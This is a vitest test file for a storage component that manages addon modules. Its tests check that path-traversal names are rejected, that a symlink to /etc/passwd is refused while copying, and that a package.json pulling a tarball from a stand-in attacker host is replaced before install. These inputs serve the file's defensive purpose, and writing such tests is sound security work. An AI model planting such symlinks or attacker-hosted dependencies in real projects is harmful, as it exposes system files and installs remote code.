import {
  chmod,
  mkdtemp,
  mkdir,
  readFile,
  rm,
  symlink,
  writeFile,
} from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, describe, expect, it } from "vitest";
import { AddonStorage } from "../src/storage.js";

const roots: string[] = [];

async function tempRoot(): Promise<string> {
  const root = await mkdtemp(join(tmpdir(), "lumi-storage-"));
  roots.push(root);
  return root;
}

afterEach(async () => {
  await Promise.all(
    roots.splice(0).map((root) => rm(root, { recursive: true, force: true })),
  );
});

const describeBun = describe.skipIf(typeof Bun === "undefined");

describe("AddonStorage paths", () => {
  it("rejects names that could escape the storage root", async () => {
    const storage = new AddonStorage(await tempRoot());
    expect(() => storage.repoDir("../outside")).toThrow("Invalid storage name");
    expect(() => storage.addonDir("a/b")).toThrow("Invalid storage name");
    expect(() => storage.backupDir(".hidden")).toThrow("Invalid storage name");
  });
});

describe("AddonStorage copy", () => {
  it("rejects symbolic links while copying", async () => {
    const root = await tempRoot();
    const storage = new AddonStorage(root);
    const source = join(root, "source");
    await mkdir(source);
    await writeFile(join(source, "index.ts"), "export default {};\\n");
    await symlink("/etc/passwd", join(source, "leak.ts"));

    await expect(
      storage.copyModule(source, join(root, "target")),
    ).rejects.toThrow("Symbolic links are not allowed");
  });
});

describeBun("AddonStorage requirements", () => {
  it("replaces an attacker-supplied package.json before installing requirements", async () => {
    const root = await tempRoot();
    const storage = new AddonStorage(root);
    const dir = join(root, "module");
    await mkdir(dir);
    await writeFile(
      join(dir, "package.json"),
      JSON.stringify({
        dependencies: { evil: "https://attacker.invalid/x.tgz" },
      }),
    );

    const bin = join(root, "bin");
    await mkdir(bin);
    const stub = join(bin, "bun");
    await writeFile(stub, "#!/bin/sh\nexit 0\n");
    await chmod(stub, 0o755);
    const originalPath = process.env.PATH;
    process.env.PATH = `${bin}:${originalPath ?? ""}`;
    try {
      await storage.installRequirements(dir, ["lodash@^4.17.21"], "sample");
    } finally {
      process.env.PATH = originalPath;
    }

    const packageJson = JSON.parse(
      await readFile(join(dir, "package.json"), "utf-8"),
    ) as { name?: string; dependencies?: unknown };
    expect(packageJson.name).toBe("lumi-addon-sample");
    expect(packageJson.dependencies).toBeUndefined();
  });
});
